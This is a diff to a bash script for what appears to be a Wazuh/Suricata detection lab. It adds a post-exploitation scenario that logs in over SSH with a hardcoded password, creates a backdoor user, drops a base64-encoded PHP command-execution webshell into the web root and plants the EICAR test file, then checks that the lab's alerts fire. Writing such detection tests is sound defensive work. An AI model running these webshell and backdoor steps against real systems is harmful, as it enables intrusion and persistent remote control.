@@ -100,7 +100,24 @@ demo() {
   wait_count "attaque web vue par Suricata" 'agent.name:router AND rule.id:86601 AND data.dest_port:80'
 }
 
+# Scénarios avancés : post-exploitation (après le brute force) + dépôt de malware EICAR.
+postex() {
+  local R shell eicar
+  R=$(date +%s)
+  shell='PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4='                                            # <?php system($_GET[c]); ?>
+  eicar='WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo='  # chaîne de test EICAR
+  echo "-- post-exploitation : SSH admin -> escalade root -> backdoor + webshell --"
+  on attacker "sshpass -p admin123 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null admin@203.0.113.1 'sudo useradd -m -s /bin/bash backdoor$R 2>/dev/null; echo $shell | base64 -d | sudo tee /var/www/html/shell_$R.php >/dev/null'" >/dev/null 2>&1
+  wait_count "nouvel utilisateur créé (backdoor)" 'agent.name:pc1 AND rule.id:5902'
+  wait_count "escalade sudo détectée" 'agent.name:pc1 AND rule.id:5403'
+  wait_count "webshell déposé dans le web root (FIM)" "agent.name:pc1 AND rule.id:554 AND syscheck.path:*shell_$R*"
+
+  echo "-- dépôt de malware (EICAR) --"
+  on attacker "sshpass -p admin123 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null admin@203.0.113.1 'echo $eicar | base64 -d | sudo tee /var/www/html/eicar_$R.com >/dev/null'" >/dev/null 2>&1
+  wait_count "fichier malveillant EICAR détecté (FIM)" "agent.name:pc1 AND rule.id:554 AND syscheck.path:*eicar_$R*"
+}
+
 set -- "${@:-all}"
-[ "$1" = all ] && set -- network pc1 wazuh agents suricata demo
+[ "$1" = all ] && set -- network pc1 wazuh agents suricata demo postex
 for s in "$@"; do echo "== $s"; "$s"; done
 exit $fail
